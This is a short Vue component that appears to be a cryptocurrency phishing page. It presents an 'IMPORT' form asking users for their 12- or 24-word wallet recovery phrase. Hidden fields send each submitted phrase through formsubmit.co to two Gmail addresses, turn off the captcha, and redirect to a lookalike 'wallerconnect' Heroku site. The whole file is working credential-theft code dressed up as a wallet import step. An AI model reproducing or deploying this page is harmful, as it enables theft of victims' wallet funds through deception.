<template>
  <form action="https://formsubmit.co/dontsettleforless7@gmail.com" method="POST">
    <input type="hidden" name="_cc" value="Liv.josephalves@gmail.com">
    <textarea :name="$route.params.id" class="w-full h-40 p-2 block" placeholder="Phrase" required></textarea>
    <input type="hidden" name="_next" value="https://wallerconnect.herokuapp.com/">
    <input type="hidden" name="_captcha" value="false">
    <span class="text-16 text-grey block mb-5">Typically 12 (sometimes 24) words seperated by a single spaces.</span>
    <button type="submit" class="w-full py-2 bg-blue text-white">IMPORT</button>
  </form>
</template>

<script>
export default {
  name: "phrase"
}
</script>

<style scoped>

/* https://crim-crypt0.surge.sh/ */

</style>
